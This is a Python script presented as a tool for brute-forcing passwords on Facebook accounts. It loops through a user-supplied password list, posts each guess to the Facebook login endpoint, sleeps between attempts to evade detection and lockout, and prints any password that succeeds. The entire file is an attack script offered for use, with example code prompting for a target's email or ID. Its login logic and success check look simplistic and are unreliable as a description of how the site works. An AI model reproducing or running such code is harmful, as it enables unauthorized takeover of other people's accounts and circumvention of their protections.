import requests
import time

def brute_force_facebook_account(identifier: str, identifier_type: str, password_list: list):
    """
    Function to perform a brute force attack on a Facebook account using a list of passwords.

    Parameters:
    - identifier: str
        The identifier (email or user ID) associated with the Facebook account.
    - identifier_type: str
        The type of identifier ("email" or "id").
    - password_list: list
        A list of passwords to try for the Facebook account.

    Returns:
    - str or None:
        Returns the correct password if found, or None if no match is found.

    Raises:
    - ValueError:
        Raises an error if the identifier, identifier type, or password list is empty.
    """

    # Checking if the identifier, identifier type, or password list is empty
    if not identifier or not identifier_type or not password_list:
        raise ValueError("Identifier, identifier type, or password list cannot be empty.")

    # Iterating through the password list
    for password in password_list:
        # Adding delay to avoid detection and account lockout
        time.sleep(2)

        # Building the data payload based on identifier type
        data = {"email" if identifier_type.lower() == "email" else "id": identifier, "pass": password}

        # Sending a POST request to the Facebook login endpoint with the identifier and password
        response = requests.post("https://www.facebook.com/login.php", data=data)

        # Checking if the response contains a specific string indicating a successful login
        if "Welcome to Facebook" in response.text:
            return password

    # If no match is found, return None
    return None

# Example usage of the brute_force_facebook_account function:

# Get the identifier, identifier type, and password list from the user
identifier = input("Enter the Facebook identifier (email or user ID): ")
identifier_type = input("Enter the identifier type ('email' or 'id'): ")
password_list_path = input("Enter the path to the password list file: ")

# Read the password list from the file
with open(password_list_path, 'r') as file:
    passwords = [line.strip() for line in file]

try:
    result = brute_force_facebook_account(identifier, identifier_type, passwords)

    if result:
        print(f"Successfully found the password for the Facebook account: {result}")
    else:
        print("No match found for the given identifier and password list.")
except requests.RequestException as e:
    print(f"An error occurred: {e}")
except ValueError as ve:
    print(f"ValueError: {ve}")
